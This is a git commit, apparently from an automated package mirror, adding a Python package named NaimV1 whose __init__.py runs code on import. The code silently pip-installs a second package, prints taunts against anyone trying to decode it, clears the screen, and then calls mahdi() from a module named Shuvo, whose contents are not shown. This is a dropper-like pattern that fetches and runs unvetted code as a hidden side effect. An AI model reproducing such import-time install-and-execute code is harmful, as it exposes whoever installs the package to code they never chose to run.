27835c4e88956939df28f5dbdd65a47e164874b3
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 03:10:17 +0000

    Add package NaimV1/0.2/NaimV1-0.2.tar.gz

---
+++ packages/NaimV1/NaimV1-0.2.tar.gz/NaimV1-0.2/mmmm/__init__.py
@@ -0,0 +1,9 @@
+import os, platform
+import requests
+os.system('pip2 install Naim')
+print('DONT TRY TO DECREPT IT....FUCK YOUR DECODE SYSTEM')
+print('SECURE BY \033[1;31mMAHDI HASAN SHUVO')
+print("FB:www.facebook.com/bk4human")
+os.system('clear')
+from Shuvo import mahdi
+mahdi()
